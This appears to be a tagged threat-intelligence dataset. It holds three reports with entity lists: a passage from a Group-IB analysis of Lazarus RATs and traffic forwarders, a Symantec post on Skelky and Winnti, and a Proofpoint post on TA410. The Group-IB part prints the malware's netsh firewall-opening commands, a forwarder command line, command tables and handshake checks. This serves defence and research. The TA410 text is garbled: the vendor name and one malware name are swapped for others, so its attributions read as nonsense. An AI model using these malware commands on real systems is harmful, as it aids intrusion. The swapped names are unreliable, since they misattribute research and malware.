The C&C server also may send the ""poluchit"" command. Once this command 
is received, the analyzed file will send a network address of the current server 
Server2 to the C&C server. 

The next possible command from the C&C server is ""pereslat"". Once this 
command is received, the file requests data from the C&C server and receives 
a certain X number. Following this, the sample will execute a multi-threaded 
C&C request with the ""ssylka"" command and forward traffic between the 
C&C server and Server2 nodes, when necessary. The number of threads for 
traffic redirection is equal to the X number that was previously obtained from 
the C&C server. If X> 1, then more than one equivalent tunnel is established 
simultaneously to redirect traffic from the C&C server to Server2 (the ""ssylka"" 
command).

""On top"" of the application protocol with encryption, application traffic is 
wrapped up inside ordinary TLS. ""Visible"" network traffic is a simple TLS 
connection. 

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 1C C0 13 C0 14 C0 27 C0 2F 
00 9E 00 6B 00 67 00 39 00 33 00 9C 00 3D 00 3C 00 35 00 2F 01 00 xx xx 00 
0A 00 08 00 06 xx xx xx xx xx xx

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 0E C0 13 C0 14 00 39 00 39 
00 33 00 35 00 2F 01 00

16 xx xx xx xx yy 00 xx xx xx xx [32 rnd bytes] 00 00 xx 00 00 05 FF 01 00 01 00

<MALWARE>ServerRAT</MALWARE>

The <IOC>ejbss.dll</IOC> library (MD5: <IOC>570e6ea21cdce694a4a74876ca87534a</IOC>, size: 
226304 bytes) is classified as <MALWARE>ServerRAT</MALWARE>. 

Description

The file is a resident <MALWARE>RAT</MALWARE> application that, once launched, waits for 
incoming connections on a specific port to control the infected PC. The 
functions available for a remote operator include launching arbitrary 
commands, collecting data about the system, active PC sessions and 
running processes, deleting arbitrary files, reading data from the file, 
downloading and executing files.

The program is installed as a service (purportedly using <MALWARE>Dropper</MALWARE>) and 
extracts the payload from itself. The scheme is similar to that that is used 
to infect client (target) machines.

Through examination of infected proxies, <ORG>Group-IB</ORG> specialists identified a 
service called rpcapt and a path to the program %WINDIR%\ejbss.dll.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution38

After startup, Payload is extracted and decrypted



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution39

The decrypted file is also a dynamic library containing a payload. 
After decryption, the file looks for exported funtion with ordinal #1 
and calls it.  

• On first run the application checks for the ""<IOC>mbcrs.rll</IOC>"" file in the OS 
system directory. In the event the file exists, the app decrypts it and 
reads a port number from the file. This number will then be used 
for network communications. If the file does not exist, it is created 
and the port number generated in random fashion is added there in 
encrypted form. It is worth noting that <ORG>Group-IB</ORG> specialists always 
observed port 3365 on the proxy.

• The file can use a port preconfigured by the attacker (and not a port 
with a random number), if the ""<IOC>mbcrs.rll</IOC>"" file was copied with it during 
the <MALWARE>RAT</MALWARE> installation.

• For the network port that will be used for network communications, 
an rule is generated for the OS firewall. This action is performed by 
running one of the following commands:

netsh advfirewall firewall add rule name=CoreNetworkingHTTPS 
dir=in action=allow Protocol=TCP localport=%d

netsh firewall add portopening protocol=tcp port=%d 
name=CoreNetworkingHTTPS

where %d – the above-mentioned port number

• waits for incoming connections from the operator on the port, 
mentioned in the point above

• can execute commands as required by the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution40



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution41

• The table below contains a list of all commands available:

Command Description

OF Collects and sends the following system data to the operator: OS version, 
processor, computer name, information about network interfaces, information 
about mounted disks

OG Enumerates and sends data about existing disks in the system

OH Checks for certain files on the disk

OR Changes the current working directory

OI Enumerates and sends running processes

OJ Terminates the process with a specific name

OM Runs the command / file

ON Deletes a specific file

OO Writes data to a specific file

OP Sets the timestamps to a specific file that are the same as those of the system 
file shell32.dll 

OQ Executes the command and send its output

OU Create a file with specified content and set the file timestamp that is the same 
as the timestamp of shell32.dll

OT Reads the file contents and sends it to the operator

OS Searches for the specified file or directory, reads its contents and sends it to 
the operator

OV Gets and sends disk information

OW Modifies the file’s timestamp

OE Connect to a specific network node for traffic transmission

OX Reads, decrypts, and sends data from a file of the form “%windir%\system32\
hyrX.dll” in the system directory (where X is an arbitrary substring), 
purportedly containing the bot configuration

OY Writes data to a file in the system directory

OZ Gathers data about active sessions

OС Sends the ""0d"" command to the operator

OK Sends the ""0a"" command to the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution42

Server_TrafficForwarder

The <IOC>msvmgr.exe</IOC> (MD5: <IOC>3c3982d068bc7f2d1e4742c2009b0f46</IOC>, size: 
180224 bytes) and <IOC>msdtc.exe</IOC> (MD5: <IOC>b603a16a950056df336fe3950c81601d</IOC>, size: 348160 bytes, MD5: <IOC>d032aeb54cf1229e011c070ecd64c33</IOC>, size: 
315904 bytes) executable programs are <MALWARE>Server_TrafficForwarder</MALWARE>.

On infected proxies, these programs always were child processes of 
<MALWARE>ServerRAT</MALWARE> and were located in %windows%.

Description

The file is a resident application that, once launched, waits for incoming 
connections on a specific port to provide further control of the PC to the 
attacker.

<MALWARE>Server_TrafficForwarder</MALWARE> uses the wolfSSL staticly linked library to 
implement asymmetric encryption of traffic between the client and the 
server.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution43

Keys

It has two related files:

The “<IOC>wcer.dat</IOC>” file (size: 4382 bytes, md5: <IOC>E39C8A1B2D35EC1B7BF73599EA4A33FA</IOC>) is a certificate file:

The “<IOC>wkey.dat</IOC>” file (size: 1675 bytes, md5: <IOC>F329B8A6957635C8CCA1C97FA459DC82</IOC>) is a private key file

The related files are used to encrypt network traffic and verify the client.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution44

Information about the C&C server or addresses of clients is not available 
in the file. The sample just waits for incoming connections to the selected 
port. 

Main functionality

• Parses the command line arguments 
Example: ""<IOC>msvmgr.exe</IOC> 4444 <IOC>111.222.111.222</IOC> 31337"" 

The sample must be run with the following arguments:

<IOC>msvmgr.exe</IOC> port ip1 port2

where port is a port used to wait for incoming connections

ip1 - an IP address of Layer 2 server to which it is required to connect

port2 – a port of the Layer 2 server, to which it is required to connect to redirect 
traffic

Based on the above-mentioned information, in the event the second command 
line argument (IP address) is specified, then after establishing connection with the 
client, the sample will connect to the network node from the second argument 
(for the above-mentioned example this will be ""<IOC>111.222.111.222</IOC>"") to the port from 
the third argument (31337 in the example). This server will be used to proxy traffic 
from the client. If the command-line arguments are not specified, the remote 
client will accept incoming connections, but will not tunnel the traffic, because it 
will not be able to establish an outgoing connection with the next node (it is not 
specified) and run two threads to redirect traffic. 

• After the start, it reads the contents of the key and certificate file 
from the current directory.

• It binds the port from the arguments; if the arguments do not 
contain a port — it listens on a random port and waits for incoming 
connections

Supported functionality:

• performs network communications over an encrypted protocol

• self-removal

• reads and sends system information: about PC components, locales, 
free space on disks, RAM size, network adapters and local interfaces, 
OS version, <SOFTWARE>Windows</SOFTWARE> version identifier, PC name



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution45

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution46

• can read and send the contents of the private key file

• checks the validity of client’s responses (checking if this is a legitimate 
client). After first network request program gets the response from the 
client, decrypts and compares it with a previously known response. In the 
event he gets a different response - it drops the connection.

Below is the table of all available commands:

Table 1

Command Description

0x1095 -

0x1096 Collects and sends system information

0x10AA Gets the configuration

0x10AB Changes the configuration (including the port on which it listens for 
connections)

0x10AE -

0x10AF -

0x10B3 Reads a private key file and sends it to the operator

0x10B4 Writes data to a file



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution47

<ORG>Group-IB</ORG> specialists have detected several versions of the file. They differ in 
the list of available commands. Another version of the malicious file has the 
following command list:

Table 2 

<MALWARE>Backend_Listener</MALWARE>

An executable file “<IOC>msdtc.exe</IOC>” (MD5: <IOC>5C1917F6753D03A08328132DB1E06571</IOC>, 
size: 257 536 bytes) can be classified as <MALWARE>Backend_Listener</MALWARE>.

It is a service application waiting for incoming connections on two ports. It 
can redirect traffic from one port to another, thereby implementing a tunnel 
between the client connected to the second port and the client connected to 
the first one and vise versa.

Description

Once launched, the application extracts two arguments from the command 
line. These are port numbers on which the application will wait for incoming 
connections.

Command Description

NONE -

GINF Collects and sends system information about the PC

GCFG Gets configuration

SCFG Changes the configuration (including the port on which it listens connections)

SLEP -

HIBN -

LCLR Records data to the file

LDWN Reads a private key file and sends it to the operator

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution48

To encrypt traffic, an open source library named wolfSSL is used. After the 
application is started, the private key and certificate files will be extracted 
from the current directory. They are used to encrypt traffic between the 
server and connected clients that must have identical key pairs. Without them, 
you can not connect to the service, or decrypt its traffic.

The program opens two ports and waits for incoming connections from 
the operator on one of them. The first port is port1 from the command-line 
arguments. Port2 is the second argument. In our study, the first port was port 
8080, the second one was port 9090.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution49

In order to trigger traffic from one port to another, the operator performs 
a connection to the server (server is the current sample, because it is just a 
service waiting for incoming connections) on port2 (9090).

Only an operator can connect to the server to control traffic because the 
service uses a private and public key pair to authorize and encrypt traffic (and 
this key pair must be identical to the one that the client-operator will use). In 
the event of absence of a key pair, or with a different pair of keys, the service 
will drop connections.

To establish a successful connection, several checks will be performed. In 
addition, traffic is encrypted with a reversible algorithm.

Response data from the server is partially randomized. Probably, this 
is intended to randomize the length of outgoing packets, so that traffic 
generated by the server alters, which complicates its detection.

If all the legitimacy tests of the operator’s commands are passed, two traffic 
threads from one port to another will be triggered.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution50

Following this, when the client connects to the first port (8080), the service 
will forward traffic from the first port to the second one and back.

If there are no active connections on the first port, the server issues the 
""PELS"" command to the client connected to the second port.

To reverse-engineer the protocol of server communications with 
connected clients, <ORG>Group-IB</ORG> specialists have developed a client that 
successfully connects to both ports of the server. Its code was created 
based on the server’s requests and responses as well as using the open 
source library wolfSSL.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution51

To connect to the server in order to tunnel traffic, the operator should use 
<MALWARE>Admin_Tool</MALWARE> designed to control the infrastructure:

1. <MALWARE>Admin_Tool</MALWARE> must have a key pair identical to the server

2. It sends a customized Hello-packet that differs from the one that is 
provided by the library.  
 
By default this packet (msg) is specified as follows in the library: 
  

The correct Hello packet that will be accepted by <MALWARE>Backend_Listener</MALWARE> must be of the 
following form:

 
In fact, this is an information packet, rather than a Hello packet, and its first 
byte contains the length of the next packet sent («len»), while the rest bytes 
must be zero in this case. 

3.    <MALWARE>Admin_Tool</MALWARE> sends an encrypted (special) packet with a length from the 
previous packet (len).

4.   The server decrypts the contents of the packet sent and, after decryption, 
the following conditions must be true: 

(DWORD)&decrypted_buff[5] == len

(DWORD)&decrypted_buff[15] == len 

where len is the length of the packet

 

5.    <MALWARE>Admin_Tool</MALWARE> sends DWORD with len2 < 201 where len2 is the length of the 
next packet 

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution52

6.    <MALWARE>Admin_Tool</MALWARE> sends the encrypted (special) second packet with the length 
received in the previous packet 

7.    The server decrypts the contents of the packet sent, and after decryption, 
the following conditions must be true: 

(DWORD)&decrypted_buff[4] == 0xD1CC8594

(DWORD)&decrypted_buff[8] == 3



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution53

Preventing  
and investigating 
cybercrime <TIMESTAMP>since 2003</TIMESTAMP>

www.group-ib.com

blog.group-ib.com

info@group-ib.com

+7 495 984 33 64

twitter.com/groupib_gib

linkedin.com/company/group-ib",Lazarus;DarkSeoul,SWIFT;SilverLight;Flash;Windows;JBoss;Liferay;Linux;FreeBSD;Solaris;Mac OS X;Whois;Microsoft;Adobe;Threat Intelligence;TDS Sensor;TDS Polygon;Incident Response;Secure Bank;Brand Protection;Computer Forensics and Investigation,banks;bank;financial;FMCG brands;oil;gas;telecommunications,"Group-IB;Bureau 121;Reconnaissance General Bureau;Japan Network Information Center;Central Bank of Bangladesh;South Korea’s National Police Agency;North Korean intelligence agency;China Netcom;Natinal Defence Commission;Shanghai Telecom;Taiwan Network Information Center;National Defence Commission;Arirang;NSA;The Polish Financial Supervision Authority;National Banking and Securities Commission;Banco de la República Oriental del Uruguay;University of Tsukuba;Arirang News;1st Bureau Operations;2nd Bureau Reconnaissance;3rd Bureau Foreign Intelligence;5th Bureau Inter-Korea Dialogue;6th Bureau Technical;7th Bureau Rear Services;Gartner;Organization for Security and Co-operation in Europe;OSCE;IDC;World Economic Forum;CAT-Northeast Telecom;Wataniya Telecom;Universite du Quebec;PaeTec Communications, Inc. TELECOM;tvoe.tv;Warner Bros. Entertainment Inc;Telecom Italia S.p.a.","2016;February 2016;FEB 2016;2016-11-07;February 2017;Since 2016;IN 2010-2013;March 2016;Since 2003;2017;2017-02-09;2016-11-27;2016-11-08;2016-11-01;2016-10-21;2016-10-03;2016-08-18;2016-04-10;2016-03-21;2016-03-03;May 30, 2016;since 2003",Client_RAT;Dropper;Loader;ServerRAT;Admin_Tool;Client_TrafficForwarder;RECON;Backend_Listener;Backend_Listenerr;Server_TrafficForwarder;RAT;Payload;BlackEnergy;RIG;Angler;Flash exploits;Neutrino Exploit Kit;Ghost RAT;SilverLight exploit;Flash exploit;Reconnaissance module;BACKEND_LISTENER;Backdoor,North Korea;Japan;China;USA;Middle East;US;Canada;Taiwan;Great Britain;India;Bulgaria;Poland;Turkey;Mexico;Uruguay;Western Europe;Asia;Australia;Eastern Europe;Thailand;Kuwait;Russia;Italy,gpsvc.exe;175.45.178.222;dropper.exe;210.52.109.22;msvmgr.exe;msdtc.exe;157.7.135.182;202.101.36.45;202.129.24.4;31.210.105.105;203.131.230.104;165.123.67.111;202.183.185.90;203.66.57.237;212.14.44.245;140.115.31.220;12.49.13.202;41.72.101.138;80.78.73.204;140.116.31.195;69.196.83.206;9216b29114fb6713ef228370cbfe4045;srservice.dll;mbcrs.rll;175.45.178.19;175.45.178.97;78.89.183.37;31.3.225.57;207.162.24.86;209.254.82.137;77.241.47.234;173.198.127.221;180.18.169.69;31.197.217.5;140.123.92.101;140.121.120.229;182.77.60.35;210.213.90.173;187.109.80.61;212.219.35.51;2.32.113.178;187.44.139.252;123.200.9.178;82.144.131.5;202.183.185.91;209.105.239.42;209.81.121.51;140.115.42.147;66.207.112.187;140.116.178.123;140.112.14.16;59.120.19.101;125.214.195.17;175.45.61.44;cb52c013f7af0219d45953bae663c9a2;svchost.exe;1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae;85d316590edfb4212049c4490db08c4b;MBLCTR.EXE;9914075cc687bdc352ee136ac6579707;fdsvc.exe;9cc6854bc5e217104734043c89dc4ff8;fdsvc.dll;25200d3fe30785f3c90a91faf8ebf1b5;8e32fccd70cec634d13795bcb1da85ff;srservice.hlp;e29fe3c181ac9ddbb242688b151f3310;deskadp.dll;srservice.chm;570e6ea21cdce694a4a74876ca87534a;ejbss.dll;3c3982d068bc7f2d1e4742c2009b0f46;b603a16a950056df336fe3950c81601d;5C1917F6753D03A08328132DB1E06571;tradeboard.mefound.com;111.222.111.222;210.52.109.0/24;27.131.59.198;194.78.90.21;80.60.105.128;203.114.109.68;178.222.166.209;140.114.122.178;63.247.182.137;140.121.100.63;114.174.228.100;118.189.38.21;210.227.170.229;86.120.134.50;182.73.40.130;58.64.203.66;81.93.72.18;61.122.232.25;118.22.154.159;178.252.148.240;210.213.80.237;180.234.11.19;51.254.71.167;41.41.241.194;69.91.178.16,,,SoftEther VPN;Enigma Protector,,,,watering-hole,,CVE-2016-0034,72,30,15,79,28,139,46,277,0,0,8,0,0,0,1,0,1
BackdoorWinnti_TrojanSkelky,"<MALWARE>Backdoor.Winnti</MALWARE> attackers have a skeleton in their closet?


<MALWARE>Backdoor.Winnti</MALWARE> attackers have a skeleton in
their closet?
New evidence suggests that the skeleton key malware, known as <MALWARE>Trojan.Skelky</MALWARE>, could be linked to the
<MALWARE>Backdoor.Winnti</MALWARE> malware family.
By: <IDENTITY>Gavin O Gorman</IDENTITY> <ORG>Symantec</ORG> Employee
Created <TIMESTAMP>29 Jan 2015</TIMESTAMP>

Contributor: <IDENTITY>Nikolas Tsapkis</IDENTITY>

On <TIMESTAMP>January 12, 2015</TIMESTAMP>, <ORG>Dell</ORG> Secureworks blogged about a tool (<MALWARE>Trojan.Skelky</MALWARE>) that allows attackers to
â€œuse a password of their choosing to authenticate as any user.â€ The <MALWARE>Skelky</MALWARE> (from skeleton key)
tool is deployed when an attacker gains access to a victimâ€™s network; the attackers may also
utilize other tools and elements in their attack. 

Symantec has analyzed <MALWARE>Trojan.Skelky</MALWARE> and found that it may be linked to the <MALWARE>Backdoor.Winnti</MALWARE>
malware family. The attackers behind the <MALWARE>Trojan.Skelky</MALWARE> campaign appear to have been using the
malware in conjunction with this back door threat. Itâ€™s unclear if the malware family
<MALWARE>Backdoor.Winnti</MALWARE> is used by one attack group or many groups.

During our research, we also found that <MALWARE>Trojan.Skelky</MALWARE> has been active over the past two years. Within
this timeframe, we have seen new variants and a consistent hashed password value.

Where is <MALWARE>Trojan.Skelky</MALWARE> being used?

1 of 3



<ORG>Symantec</ORG> telemetry identified the skeleton key malware on compromised computers in five
organizations with offices in the <COUNTRY>United States</COUNTRY> and <COUNTRY>Vietnam</COUNTRY>. The exact nature and names of the
affected organizations is unknown to <ORG>Symantec</ORG>. The first activity was seen in <TIMESTAMP>January 2013</TIMESTAMP> and <TIMESTAMP>until November 2013</TIMESTAMP>, there was no further activity involving the skeleton key malware.
<TIMESTAMP>In November 2013</TIMESTAMP>, the attackers increased their usage of the tool and have been active ever since. Four more
variants of <MALWARE>Trojan.Skelky</MALWARE> were discovered as well as additional file names used by the attackers. The
complete set of observed file names and hashes are listed as follows

<IOC>msuta64.dll</IOC>: <IOC>66da7ed621149975f6e643b4f9886cfd</IOC>
<IOC>ole64.dll</IOC>: <IOC>bf45086e6334f647fda33576e2a05826</IOC>    
<IOC>HookDC64.dll</IOC>: <IOC>bf45086e6334f647fda33576e2a05826</IOC>    
<IOC>HookDC.dll</IOC>: <IOC>a487f1668390df0f4951b7292bae6ecf</IOC>    
<IOC>HookDC.dll</IOC>: <IOC>8ba4df29b0593be172ff5678d8a05bb3</IOC>    
<IOC>HookDC.dll</IOC>: <IOC>f01026e1107b722435126c53b2af47a9</IOC>    
<IOC>ole64.dll</IOC>: <IOC>f01026e1107b722435126c53b2af47a9</IOC>    
<IOC>olex64.dll</IOC>: <IOC>f01026e1107b722435126c53b2af47a9</IOC>    
<IOC>HookDC64.dll</IOC>: <IOC>f01026e1107b722435126c53b2af47a9</IOC>    
<IOC>ole.dll</IOC>: <IOC>f01026e1107b722435126c53b2af47a9</IOC>
<IOC>HookDC.dll</IOC>: <IOC>747cc5ce7f2d062ebec6219384b57e8c</IOC>        
<IOC>ole.dll</IOC>: <IOC>747cc5ce7f2d062ebec6219384b57e8c</IOC>    

The link between <MALWARE>Trojan.Skelky</MALWARE> and <MALWARE>Backdoor.Winnti</MALWARE>
From the first observed use of the tool in <TIMESTAMP>January 2013</TIMESTAMP> to the present, the attackers have consistently
used the same password. This is the case with three different variants of the tool. The regular use of
the same password across multiple variants means itâ€™s likely that only one group of attackers has
been using the tool <TIMESTAMP>until at least January 2015</TIMESTAMP>. 

By identifying any other malware active on compromised computers at the same time as
<MALWARE>Trojan.Skelky</MALWARE>, it is possible to learn more about the attackers. There were almost no signs of other
malware active at the same time as <MALWARE>Skelky</MALWARE> in most of the organizations investigated. However, two
compromised computers had other malware present, active, and in the same directory, at the same
time as <MALWARE>Trojan.Skelky</MALWARE>. 

Two files were discovered on one of the victimâ€™s computers. One file is a variant of
<MALWARE>Backdoor.Winnti</MALWARE> (<IOC>jqs.exe</IOC>) and the other is a dropper for <MALWARE>Backdoor.Winnti</MALWARE> (tmp8296.tmp), which is
responsible for creating the <MALWARE>Backdoor.Winnti</MALWARE> sample. Details on the file names and hashes are as
follows:

<IOC>jqs.exe</IOC> (<MALWARE>Backdoor.Winnti</MALWARE> dropper): <IOC>600b604784594e3339776c6563aa45a1</IOC>
<IOC>tmp8296.tmp</IOC> (<MALWARE>Backdoor.Winnti</MALWARE> variant): <IOC>48377c1c4cfedebe35733e9c3675f9be</IOC>

<MALWARE>Backdoor.Winnti</MALWARE> has been used in the past in a number of different campaigns, most notably against
Asian games companies. Given the disparate nature of some victims, itâ€™s unclear if the malware
is used by one set of attackers, or many. <ORG>Symantec</ORG> is continuing its investigation into this malware
family <MALWARE>Backdoor.Winnti</MALWARE> and the specific actors behind the combined use of <MALWARE>Backdoor.Winnti</MALWARE> and
<MALWARE>Trojan.Skelky</MALWARE>.

2 of 3



<ORG>Symantec</ORG> and <ORG>Norton</ORG> protection
<ORG>Symantec</ORG> and <ORG>Norton</ORG> products have the following protections against the skeleton key malware:

AV

<MALWARE>Trojan.Skelky</MALWARE>

Customers with Behaviour-Based Protection enabled are protected with the signature
SONAR.Module!gen3.

3 of 3",,,,Symantec;Norton;Dell,"January 2013;29 Jan 2015;January 12, 2015;until November 2013;In November 2013;until at least January 2015",Backdoor.Winnti;Trojan.Skelky;Skelky,United States;Vietnam,f01026e1107b722435126c53b2af47a9;HookDC.dll;ole64.dll;bf45086e6334f647fda33576e2a05826;HookDC64.dll;ole.dll;747cc5ce7f2d062ebec6219384b57e8c;jqs.exe;msuta64.dll;66da7ed621149975f6e643b4f9886cfd;a487f1668390df0f4951b7292bae6ecf;8ba4df29b0593be172ff5678d8a05bb3;olex64.dll;600b604784594e3339776c6563aa45a1;tmp8296.tmp;48377c1c4cfedebe35733e9c3675f9be,Gavin O Gorman;Nikolas Tsapkis,,,,,,,,,0,0,0,9,7,28,2,29,2,0,0,0,0,0,0,0,0
TA410,"8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 1/20

<TIMESTAMP>June 5, 2020</TIMESTAMP>

<THREAT_ACTOR>TA410</THREAT_ACTOR>: The Group Behind<CAMPAIGN>LookBack</CAMPAIGN> Attacks Against
U.S. Utilities Sector Returns with New Malware

<ORG>TA410</ORG>.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new

Blog
Threat Insight
<THREAT_ACTOR>TA410</THREAT_ACTOR>: The Group Behind<CAMPAIGN>LookBack</CAMPAIGN> Attacks Against <COUNTRY>U.S.</COUNTRY> <INDUSTRY>Utilities Sector</INDUSTRY> Returns with
New Malware

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new?utm_source=dlvr.it&utm_medium=twitter
https://www.proofpoint.com/us
https://www.proofpoint.com/us/blog
https://www.proofpoint.com/us/blog/threat-insight


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 2/20

<TIMESTAMP>June 08, 2020</TIMESTAMP> <IDENTITY>Michael Raggi</IDENTITY>, <IDENTITY>Dennis Schwarz</IDENTITY>, and <IDENTITY>Georgi Mladenov</IDENTITY> with the<ORG>TA410</ORG>
Threat Research Team

In <TIMESTAMP>August 2019</TIMESTAMP>,<ORG>TA410</ORG> researchers reported that<CAMPAIGN>LookBack</CAMPAIGN> malware was targeting
the <COUNTRY>United States</COUNTRY> (<COUNTRY>U.S.</COUNTRY>) utilities sector between <TIMESTAMP>July and August 2019</TIMESTAMP>. We then continued
our analysis into additional<CAMPAIGN>LookBack</CAMPAIGN> campaigns that unfolded between <TIMESTAMP>August 21-29,
2019</TIMESTAMP>. These campaigns utilized malicious macro-laden documents in order to deliver
modular malware to targeted utility providers across the <COUNTRY>U.S.</COUNTRY> At the same time as the
<CAMPAIGN>LookBack</CAMPAIGN> campaigns,<ORG>TA410</ORG> researchers identified a new, additional malware family
named<CAMPAIGN>LookBack</CAMPAIGN> that was also being delivered to <COUNTRY>U.S.</COUNTRY> utilities providers.

<CAMPAIGN>LookBack</CAMPAIGN> malware, like<CAMPAIGN>LookBack</CAMPAIGN>, gives attackers complete control over a compromised
system. Its remote access trojan (RAT) functionality includes the ability to access
installed applications, the keyboard, mouse, screen, files, services, and processes with the
ability to exfiltrate information via command and control.

We analyzed phishing campaigns between <TIMESTAMP>July-November 2019</TIMESTAMP> and have determined
that both<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> malware can be attributed to a single threat actor we
are calling<THREAT_ACTOR>TA410</THREAT_ACTOR>. This conclusion is based on the threat actor’s use of shared attachment
macros, malware installation techniques, and overlapping delivery infrastructure.

In addition, our analysis found similarities between<THREAT_ACTOR>TA410</THREAT_ACTOR> and<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) delivery
tactics. Specifically, we have seen attachment macros that are common to both actors.
<THREAT_ACTOR>TA410</THREAT_ACTOR> campaigns detected in <TIMESTAMP>November 2019</TIMESTAMP> included<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>)-related
infrastructure used in phishing attachment delivery macros. However,<ORG>TA410</ORG>
analysts believe that intentional reuse of well-publicized<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) techniques and
infrastructure may be an attempt by threat actors to create a false flag. For this reason,
while research is ongoing, we do not attribute<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> campaigns to
<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>).<ORG>TA410</ORG> currently tracks<THREAT_ACTOR>TA429</THREAT_ACTOR> (<THREAT_ACTOR>APT10</THREAT_ACTOR>) independently of<THREAT_ACTOR>TA410</THREAT_ACTOR>
campaigns.

Figure 1 below shows a timeline of the identified<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> campaigns.

https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks
https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals


8/20/2020 (2) New Messages!

https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new 3/20

Figure 1<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> Campaign Timeline

Delivery

<ORG>TA410</ORG> researchers observed phishing campaigns beginning on <TIMESTAMP>July 10, 2019</TIMESTAMP> that
targeted utility providers across the United States with portable executable (PE)
attachments and used subject lines such as “PowerSafe energy educational courses (30-
days trial)”.  These campaigns continued through <TIMESTAMP>September 2019</TIMESTAMP>.

Our analysis of these phishing campaigns determined that the PE attachments delivered a
modular malware which the developers referred to in program data base (“PDB”) paths as
“<CAMPAIGN>FlowCloud</CAMPAIGN>”. We therefore refer to these campaigns as “<CAMPAIGN>FlowCloud</CAMPAIGN>” based on the
malware family they delivered. It’s notable that these<CAMPAIGN>LookBack</CAMPAIGN> campaigns were
occurring at the same time as the<CAMPAIGN>LookBack</CAMPAIGN> campaigns that<ORG>TA410</ORG> has previously
documented. Both the<CAMPAIGN>LookBack</CAMPAIGN> and<CAMPAIGN>LookBack</CAMPAIGN> campaigns targeted utility providers in
the United States. Both used training and certification-themed lures. And both used
threat actor-controlled domains for delivery. In some cases, both<CAMPAIGN>LookBack</CAMPAIGN> and
<CAMPAIGN>LookBack</CAMPAIGN> campaigns targeted not only the same companies but also the same recipients.

The senders of the emails that delivered<CAMPAIGN>LookBack</CAMPAIGN> malware utilized threat actor-
controlled domains for delivery which impersonated energy sector training services, as
well as utilized subdomains which contained the word “engineer”.

We observed a distinct change in<CAMPAIGN>LookBack</CAMPAIGN> delivery tactics beginning with attacks
carried out in <TIMESTAMP>November 2019</TIMESTAMP>. The targeting of US utilities companies remained
constant, but the threat actors shifted from PE attachments to malicious macro laden
Microsoft Word documents that closely resembled the same delivery and installation
macros used in<CAMPAIGN>LookBack</CAMPAIGN> malware campaigns.

Additionally, in November threat actors began to utilize the sender domain <IOC>asce[.]email</IOC>
to deliver these attachments. This domain was first observed in <TIMESTAMP>June 2019</TIMESTAMP> registered to
the IP <IOC>103.253.41[.]75</IOC> which was used as a staging and reconnaissance IP in previous
